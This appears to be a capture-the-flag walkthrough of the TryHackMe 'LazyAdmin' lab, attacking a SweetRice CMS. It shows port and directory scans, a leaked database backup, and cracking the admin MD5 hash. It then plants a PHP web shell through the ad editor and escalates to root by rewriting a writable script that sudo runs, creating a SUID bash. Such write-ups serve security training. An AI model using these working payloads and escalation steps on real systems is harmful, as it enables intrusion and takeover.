@@ -1,0 +1,426 @@
+LAZYADMIN.
+
+
+
+1.SCANNING:
+1.1. SCANNING: PORTS.
+Quick nmap scan:
+nmap -sS -T4 -sV 10.10.33.131
+OUTPUT:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+1.2. SCANNING: SITE EXPLORING.
+The site (http://10.10.33.131/) shows the apache2 ubuntu default page.
+
+
+
+
+1.3. SCANNING: DIRECTORY ENUMMERATION:
+Quick gobuster scan:
+gobuster dir -u http://10.10.33.131 -w /usr/share/wordlists/dirb/common.txt
+OUTPUT:
+/.hta                 (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/content              (Status: 301) [Size: 314] [--> http://10.10.33.131/content/]
+/index.html           (Status: 200) [Size: 11321]
+/server-status        (Status: 403) [Size: 277]
+Progress: 4614 / 4615 (99.98%)
+Note:
+Only possibly interesting path is /content. We check it out. The server is running Sweetrice as its CMS. We inspect to try to figure out the version used. It isn't mentionned.
+
+
+Knowing the landing site hasn't been change from default, we try to look for default Sweetrice links.
+
+
+Admin RSS feed (http://10.10.33.131/content/as/?type=atom):
+The link works, inspecting source we find http://10.10.33.131/content/js/SweetRice.js (which we could have found via gobuster really). On said file:
+/**
+ * SweetRice javascript function.
+ *
+ * @package SweetRice
+ * @Dashboard core
+ * @since 0.5.4
+ */
+<!--
+
+
+
+
+2. EXPLOIT: SWEETRICE RFI.
+Doing some research, we find CVE 2009-4224 (https://www.exploit-db.com/exploits/10246).
+Note:
+http://10.10.33.131/content/_plugin/subscriber/inc/post.php returns not found. Exploit won't work.
+
+
+
+ 
+1.4. SCANNING: FILE ENUMMERATION:
+Gobuster file scan:
+gobuster dir -u http://10.10.33.131 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
+Note:
+No useful output.
+
+
+
+
+Note:
+Out of ideas, we try other exploits.
+SWEETRICE 1.5.1 - BACKUP DISCLOSURE (https://www.exploit-db.com/exploits/40718):
+Site:
+http://10.10.17.41/inc/mysql_backup
+OUTPUT:
+Not Found
+
+
+Site:
+http://10.10.17.41/SweetRice-transfer.zip
+OUTPUT:
+Not Found
+
+
+
+
+SweetRice 1.5.1 - Arbitrary File Upload (https://www.exploit-db.com/exploits/40716):
+We need a password and user (which we don't have).
+
+
+
+
+SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution (https://www.exploit-db.com/exploits/40700):
+We need an admin to login for this exploit to work.
+
+
+
+
+RETRY: SweetRice 1.5.1 - Arbitrary File Download (https://www.exploit-db.com/exploits/40698):
+Knowing /content is used in the machine, we will run
+
+
+
+SweetRice 1.5.1 - Cross-Site Request Forgery (https://www.exploit-db.com/exploits/40692):
+We need an admin to login for this exploit to work.
+
+
+
+
+RETRY: SWEETRICE 1.5.1 - BACKUP DISCLOSURE (https://www.exploit-db.com/exploit>
+Since we know the machine uses /content, we will run the command again, but with inc/mysql_backup as a content subdirectory:
+http://10.10.17.41/inc/mysql_backup
+OUTPUT:
+Index of /content/inc/mysql_backup
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	-	 
+[   ]	mysql_bakup_20191129023059-1.5.1.sql	2019-11-29 12:30	4.7K	 
+Apache/2.4.18 (Ubuntu) Server at 10.10.17.41 Port 80
+Note:
+We found the backup directory.
+
+
+Check out the backup:
+<?php return array (
+  0 => 'DROP TABLE IF EXISTS `%--%_attachment`;',
+  1 => 'CREATE TABLE `%--%_attachment` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `post_id` int(10) NOT NULL,
+  `file_name` varchar(255) NOT NULL,
+  `date` int(10) NOT NULL,
+  `downloads` int(10) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+  2 => 'DROP TABLE IF EXISTS `%--%_category`;',
+  3 => 'CREATE TABLE `%--%_category` (
+  `id` int(4) NOT NULL AUTO_INCREMENT,
+  `name` varchar(255) NOT NULL,
+  `link` varchar(128) NOT NULL,
+  `title` text NOT NULL,
+  `description` varchar(255) NOT NULL,
+  `keyword` varchar(255) NOT NULL,
+  `sort_word` text NOT NULL,
+  `parent_id` int(10) NOT NULL DEFAULT \'0\',
+  `template` varchar(60) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `link` (`link`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+  4 => 'DROP TABLE IF EXISTS `%--%_comment`;',
+  5 => 'CREATE TABLE `%--%_comment` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `name` varchar(60) NOT NULL DEFAULT \'\',
+  `email` varchar(255) NOT NULL DEFAULT \'\',
+  `website` varchar(255) NOT NULL,
+  `info` text NOT NULL,
+  `post_id` int(10) NOT NULL DEFAULT \'0\',
+  `post_name` varchar(255) NOT NULL,
+  `post_cat` varchar(128) NOT NULL,
+  `post_slug` varchar(128) NOT NULL,
+  `date` int(10) NOT NULL DEFAULT \'0\',
+  `ip` varchar(39) NOT NULL DEFAULT \'\',
+  `reply_date` int(10) NOT NULL DEFAULT \'0\',
+  PRIMARY KEY (`id`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+  6 => 'DROP TABLE IF EXISTS `%--%_item_data`;',
+  7 => 'CREATE TABLE `%--%_item_data` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `item_id` int(10) NOT NULL,
+  `item_type` varchar(255) NOT NULL,
+  `data_type` varchar(20) NOT NULL,
+  `name` varchar(255) NOT NULL,
+  `value` text NOT NULL,
+  PRIMARY KEY (`id`),
+  KEY `item_id` (`item_id`),
+  KEY `item_type` (`item_type`),
+  KEY `name` (`name`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+  8 => 'DROP TABLE IF EXISTS `%--%_item_plugin`;',
+  9 => 'CREATE TABLE `%--%_item_plugin` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `item_id` int(10) NOT NULL,
+  `item_type` varchar(255) NOT NULL,
+  `plugin` varchar(255) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+  10 => 'DROP TABLE IF EXISTS `%--%_links`;',
+  11 => 'CREATE TABLE `%--%_links` (
+  `lid` int(10) NOT NULL AUTO_INCREMENT,
+  `request` text NOT NULL,
+  `url` text NOT NULL,
+  `plugin` varchar(255) NOT NULL,
+  PRIMARY KEY (`lid`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+  12 => 'DROP TABLE IF EXISTS `%--%_options`;',
+  13 => 'CREATE TABLE `%--%_options` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `name` varchar(255) NOT NULL,
+  `content` mediumtext NOT NULL,
+  `date` int(10) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `name` (`name`)
+) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
+  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
+  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
+  16 => 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',
+  17 => 'DROP TABLE IF EXISTS `%--%_posts`;',
+  18 => 'CREATE TABLE `%--%_posts` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `name` varchar(255) NOT NULL,
+  `title` varchar(255) NOT NULL,
+  `body` longtext NOT NULL,
+  `keyword` varchar(255) NOT NULL DEFAULT \'\',
+  `tags` text NOT NULL,
+  `description` varchar(255) NOT NULL DEFAULT \'\',
+  `sys_name` varchar(128) NOT NULL,
+  `date` int(10) NOT NULL DEFAULT \'0\',
+  `category` int(10) NOT NULL DEFAULT \'0\',
+  `in_blog` tinyint(1) NOT NULL,
+  `views` int(10) NOT NULL,
+  `allow_comment` tinyint(1) NOT NULL DEFAULT \'1\',
+  `template` varchar(60) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `sys_name` (`sys_name`),
+  KEY `date` (`date`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+);?>
+
+
+We check for passwords:
+grep 'passwd' mysql_bakup_20191129023059-1.5.1.sql
+OUTPUT:
+s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"
+Note:
+Hash is:
+42f749ade7f9e195bf475f37a44cafcb
+
+
+Identify hash:
+hashid 42f749ade7f9e195bf475f37a44cafcb
+OUTPUT:
+Analyzing '42f749ade7f9e195bf475f37a44cafcb'
+[+] MD2 
+[+] MD5 
+[+] MD4 
+[+] Double MD5 
+[+] LM 
+[+] RIPEMD-128 
+[+] Haval-128 
+[+] Tiger-128 
+[+] Skein-256(128) 
+[+] Skein-512(128) 
+[+] Lotus Notes/Domino 5 
+[+] Skype 
+[+] Snefru-128 
+[+] NTLM 
+[+] Domain Cached Credentials 
+[+] Domain Cached Credentials 2 
+[+] DNSSEC(NSEC3) 
+[+] RAdmin v2.x 
+
+
+We create a file where we copy the hash, and crack it via john:
+john  --format=raw-md5 --wordlist=/home/user0/thm/rockyou.txt hash_lazy.txt
+OUTPUT:
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Password123      (?)     
+1g 0:00:00:00 DONE (2025-07-16 20:42) 100.0g/s 3379Kp/s 3379Kc/s 3379KC/s classof2011..redcat
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+
+
+
+
+WEB PORTAL LOGIN:
+In the portal we found earlier (http://10.10.17.41/content/as/?type=atom) we could use the password.
+Looking back at the backup, a username also appears in a serialized array:
+s:5:"admin";s:7:"manager";
+We try out said credential pair, and get past the portal.
+
+
+
+
+WEB PORTAL EXPLORING:
+On the side navigation bar, settings > General option, we find:
+Database Setting
+Database : mysql
+Database Host : localhost
+Database Port : 3306
+Database Account : rice
+Database Password : randompass
+
+
+We try to connect to the database:
+mysql -u rice -p -h 10.10.17.41 -P 3306 mysql
+OUTPUT:
+ERROR 2002 (HY000): Can't connect to server on '10.10.17.41' (115)
+
+
+Verifying it isn't accesible:
+telnet 10.10.17.41 3306
+OUTPUT:
+telnet: Unable to connect to remote host: Connection refused
+
+
+
+
+Note:
+Now that we have access to the panel, we can try out those exploits that we couldn't do before.
+SWEETRICE 1.5.1 - CROSS-SITE REQUEST FORGERY / PHP CODE EXECUTION:
+We begin by visiting the ad dashboard:
+http://10.10.17.41/content/as/?type=ad&mode=add
+
+
+And then create a new add named whatever (shell), with content:
+<?php system($_GET['cmd']); ?>
+
+
+Our shell is now running at:
+http://10.10.17.41/content/inc/ads
+OUTPUT:
+Index of /content/inc/ads
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	-	 
+[   ]	shell.php	2025-07-16 22:13	30	 
+Apache/2.4.18 (Ubuntu) Server at 10.10.17.41 Port 80
+
+
+Now we can run any command by changing the nav-bar with the following syntax:
+http://10.10.17.41/content/inc/ads/shell.php?cmd=<command>
+
+
+We want to check where user flag is (find / -name user.txt 2>/dev/null) so we need to encode the URL properly. To get the argument right, we can visit urlencoder.org, or run the following script:
+python3 -c 'import urllib.parse; print(urllib.parse.quote("find / -name user.txt 2>/dev/null"))'
+OUTPUT:
+find%20/%20-name%20user.txt%202%3E/dev/null
+
+
+Now we can run the full command:
+find%20/%20-name%20user.txt%202%3E/dev/null
+OUTPUT:
+/home/itguy/user.txt
+
+
+Cat the user flag:
+Argument format:
+python3 -c 'import urllib.parse; print(urllib.parse.quote("cat /home/itguy/user.txt"))'
+OUTPUT:
+cat%20/home/itguy/user.txt
+Command:
+http://10.10.17.41/content/inc/ads/shell.php?cmd=cat%20/home/itguy/user.txt
+OUTPUT:
+THM{63e5bce9271952aad1113b6f1ac28a07}
+
+
+
+
+PRIVESC:
+Sudo privileges:
+http://10.10.17.41/content/inc/ads/shell.php?cmd=sudo%20-l
+OUTPUT:
+Matching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+Note:
+This means we can run perl on the file backup.pl as sudo. 
+
+
+First we check the backup file:
+http://10.10.17.41/content/inc/ads/shell.php?cmd=cat%20/home/itguy/backup.pl
+OUTPUT:
+#!/usr/bin/perl system("sh", "/etc/copy.sh");
+Note:
+This means it will run copy.sh as root. 
+
+
+We need to check if copy.sh is writeable:
+ls /etc/copy.sh
+OUTPUT:
+-rw-r--rwx 1 root root 81 Nov 29 2019 /etc/copy.sh
+
+
+First, we create our script to spawn a root shell, with 3 echoes:
+echo '#!/bin/bash' > /etc/copy.sh
+echo 'cp /bin/bash /tmp/rootbash' >> /etc/copy.sh
+echo 'chmod +s /tmp/rootbash' >> /etc/copy.sh
+
+
+First echo:
+Raw:
+echo '#!/bin/bash' > /etc/copy.sh
+Full encoded:
+http://10.10.17.41/content/inc/ads/shell.php?cmd=echo%20%27%23%21%2Fbin%2Fbash%27%20%3E%20%2Fetc%2Fcopy.sh%0A
+
+
+Second echo:
+Raw:
+echo 'cp /bin/bash /tmp/rootbash' >> /etc/copy.sh
+Full encoded:
+http://10.10.17.41/content/inc/ads/shell.php?cmd=echo%20%27cp%20%2Fbin%2Fbash%20%2Ftmp%2Frootbash%27%20%3E%3E%20%2Fetc%2Fcopy.sh%0A
+
+
+Third and last echo:
+Raw:
+echo 'chmod +s /tmp/rootbash' >> /etc/copy.sh
+Full encoded:
+http://10.10.17.41/content/inc/ads/shell.php?cmd=echo%20%27chmod%20%2Bs%20%2Ftmp%2Frootbash%27%20%3E%3E%20%2Fetc%2Fcopy.sh%0A
+
+
+Confirm copy is executable:
+http://10.10.17.41/content/inc/ads/shell.php?cmd=chmod%20+x%20/etc/copy.sh
+
+
+Run perl script as root (trigger payload):
+http://10.10.17.41/content/inc/ads/shell.php?cmd=sudo%20/usr/bin/perl%20/home/itguy/backup.pl
+
+
+Run root shell:
+http://10.10.17.41/content/inc/ads/shell.php?cmd=/tmp/rootbash%20-p
+
+
+Grab root flag:
+http://10.10.17.41/content/inc/ads/shell.php?cmd=cat%20/root/root.txt
+
